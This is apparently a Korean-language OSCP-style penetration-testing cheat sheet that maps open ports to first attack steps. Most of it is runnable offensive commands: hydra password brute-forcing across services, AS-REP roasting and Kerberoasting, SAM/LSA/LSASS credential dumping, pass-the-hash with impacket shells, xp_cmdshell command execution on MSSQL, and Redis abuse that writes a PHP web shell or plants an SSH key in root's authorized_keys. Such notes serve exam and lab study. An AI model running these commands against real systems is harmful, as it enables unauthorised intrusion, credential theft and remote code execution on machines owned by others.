# 02. 포트 → 첫 수

nmap 결과에서 포트로 찾는다. `$T` 는 [[00. START]]. 웹(80/443/8080…)이면 [[01. 제품 → 첫 수]] 먼저.
전체 사례·상세: [[02. 서비스·포트별 색인]] · 크랙/페이로드/전송 [[09. 크랙·페이로드·전송]]

> **hydra 서비스별 브루트** (유저명 확보 후, 온라인 브루트는 시험서 신중히 — 정답 신호일 때만):
> ```bash
> hydra -L users.txt -P rockyou.txt ftp://$T
> hydra -L users.txt -P rockyou.txt ssh://$T -t 4
> hydra -L users.txt -P rockyou.txt $T smb          # (구형) · 보통 nxc 스프레이가 나음
> hydra -L users.txt -P rockyou.txt rdp://$T
> hydra -L users.txt -P rockyou.txt pop3://$T
> hydra -l USER -P rockyou.txt $T http-post-form "/login:user=^USER^&pass=^PASS^:F=invalid"
> hydra -L users.txt -P rockyou.txt mysql://$T   # / postgres:// / mssql://
> ```

## 21 FTP
```bash
ftp anonymous@$T                          # 익명. 비번 아무거나
curl -s "ftp://anonymous:anon@$T/" --list-only
nxc ftp $T -u U -p P                       # 크리덴셜 재사용 확인
# 업로드 되고 웹루트와 겹치면 → 웹셸. 버전 → searchsploit
```

## 22 SSH
버전만 기록. 자격증명 확보 후 재방문. 유저열거는 시간낭비.
```bash
ssh -o PreferredAuthentications=password user@$T   # 찾은 크리덴셜로
# 개인키 얻었으면: chmod 600 id_rsa; ssh -i id_rsa user@$T (암호걸리면 ssh2john→크랙)
```

## 25/465/587 SMTP
```bash
nc -nv $T 25          # 배너 → VRFY user / EXPN / RCPT TO 로 사용자 열거
smtp-user-enum -M VRFY -U /usr/share/seclists/Usernames/Names/names.txt -t $T
# 오픈릴레이 확인: MAIL FROM:<a@a.com> → RCPT TO:<외부주소> 수락되면 릴레이
# 인증되면 메일 발송(피싱·XXE 첨부). swaks 로: swaks --to x@$T --from a@a --server $T
```

## 88 Kerberos → **AD 확정**
```bash

impacket-GetNPUsers DOMAIN/ -dc-ip $T -usersfile users.txt -no-pass   # AS-REP
```
→ [[07. AD]]

## 110/143 POP3/IMAP
자격증명 확보 후 메일함에서 재사용 비번 탐색.
```bash
curl -s "imap://$T/INBOX?ALL" -u USER:PASS
curl -s "pop3://$T/1" -u USER:PASS
```
⚠️ POP3 `USER` 로 유저 열거 안 됨(없는 유저도 +OK). 유저는 다른 서비스에서.

## 111 rpcbind / 2049 NFS
```bash
showmount -e $T                           # 익스포트 목록
sudo mount -o rw,vers=3 $T:/share /mnt/nfs
# no_root_squash면 → SUID 심기 (privesc): [[03. 리눅스 셸 뒤]] 6절
```

## 135/139/445 SMB → 항상 널 세션부터
```bash
nxc smb $T                               # 호스트명·도메인·OS·SMB서명 (항상 첫 줄)
nxc smb $T -u '' -p '' --shares          # 널 세션 공유
nxc smb $T -u guest -p '' --shares       # 게스트
nxc smb $T -u '' -p '' --rid-brute       # 널로 유저 열거 (RID)
smbclient -L //$T -N ; enum4linux-ng -A $T
rpcclient -U '' -N $T                     # enumdomusers, querydispinfo
nmap -p445 --script smb-vuln* $T          # MS17-010 등
```
```bash
# 자격증명 확보 후 — nxc가 privesc 실마리를 한 번에 긁는다
nxc smb $T -u U -p P                      # (Pwn3d!)=로컬admin → evil-winrm/psexec
nxc smb $T -u U -p P --shares --users --pass-pol --sessions --loggedon-users
nxc smb $T -u U -p P -M spider_plus       # 공유 내 파일 전수 (크리덴셜 파일 사냥)
nxc smb $T -u U -p P --sam --lsa          # (admin) SAM·LSA 시크릿 덤프
nxc smb $T -u U -p P -M lsassy            # (admin) LSASS 메모리 크리덴셜
nxc smb SUBNET -u U -p P --continue-on-success   # 대역 스프레이 → 어디서 admin인지
nxc smb $T -u U -H NThash                 # Pass-the-Hash
```
```bash
# (Pwn3d!)=admin이면 impacket으로 대화형 셸 — 위에서부터 시도(탐지·안정성 순)
impacket-psexec   $T/U:P@$T               # SYSTEM 셸 (서비스 생성, 시끄러움)
impacket-wmiexec  $T/U:P@$T               # 반대화형, 더 은밀 (WMI)
impacket-smbexec  $T/U:P@$T               # 서비스+SMB (psexec 대안)
impacket-atexec   $T/U:P@$T whoami        # 스케줄태스크로 명령
impacket-dcomexec $T/U:P@$T               # DCOM
# 해시만 있으면(PtH): 위 전부 -hashes :NThash 로. 로컬계정이면 './U' 또는 -local-auth 개념
impacket-psexec -hashes :NThash Administrator@$T
impacket-secretsdump $T/U:P@$T            # SAM+LSA+캐시 원격 덤프 (admin)
```

## 389/636/3268 LDAP
```bash
ldapsearch -x -H ldap://$T -b "dc=oscp,dc=exam"   # 익명 바인드
nxc ldap $T -u '' -p ''                    # 익명 → 도메인 정보
# 자격증명 있으면 AD 크리덴셜 사냥 원샷:
nxc ldap $T -u U -p P --asreproast asrep.txt --kerberoasting kerb.txt
nxc ldap $T -u U -p P -M laps -M user-desc -M get-desc-users   # LAPS·설명필드 평문
nxc ldap $T -u U -p P --gmsa               # gMSA 비번  (AD 전체는 [[07. AD]])
# impacket 병기 — 크리덴셜 없이도(88 열림):
impacket-GetNPUsers DOMAIN/ -dc-ip $T -usersfile users.txt -no-pass -request -outputfile asrep.txt
impacket-GetUserSPNs DOMAIN/U:P -dc-ip $T -request -outputfile kerb.txt   # 자격증명 있을 때
impacket-lookupsid DOMAIN/U:P@$T           # 도메인 SID + 유저 열거(RID)
```

## 1433 MSSQL
```bash
nxc mssql $T -u U -p P                      # 유효성 (도메인이면 --local-auth 빼고)
nxc mssql $T -u U -p P --local-auth         # 로컬 SQL 계정 (sa 등)
nxc mssql $T -u sa -p '' --local-auth       # sa 빈/약한 비번
nxc mssql $T -u U -p P -x "whoami"          # xp_cmdshell 자동 활성+실행
impacket-mssqlclient sa:PASS@$T             # 로컬 SQL 로그인 (sa 등)
impacket-mssqlclient -windows-auth $T/U:P@$T   # 도메인 인증
# 대화형 안에서: enable_xp_cmdshell → xp_cmdshell whoami
#   링크드서버: EXEC ('xp_cmdshell ''whoami''') AT [SRV]  /  EXECUTE AS LOGIN='sa'
```

## 6379 Redis
```bash
redis-cli -h $T                            # unauth 흔함. info · CONFIG GET dir
redis-cli -h $T -a PASS                    # 비번 있으면
# RCE ① 웹셸 쓰기 (웹루트 알면)
redis-cli -h $T config set dir /var/www/html; redis-cli -h $T config set dbfilename s.php
redis-cli -h $T set x '<?php system($_GET[c]);?>'; redis-cli -h $T save
# RCE ② SSH키 심기
redis-cli -h $T config set dir /root/.ssh; redis-cli -h $T config set dbfilename authorized_keys
redis-cli -h $T set x "$(echo -e '\n\n'; cat ~/.ssh/id_rsa.pub; echo -e '\n\n')"; redis-cli -h $T save
# RCE ③ 모듈 로드 (RedisModules-ExecuteCommand)
```

## 커스텀·비표준 포트 (43·1978·3573·7742 …)

```bash
nc -nv $T PORT                           # 배너 직접
nmap -sV -p PORT --version-intensity 9 $T
searchsploit '제품버전'
```
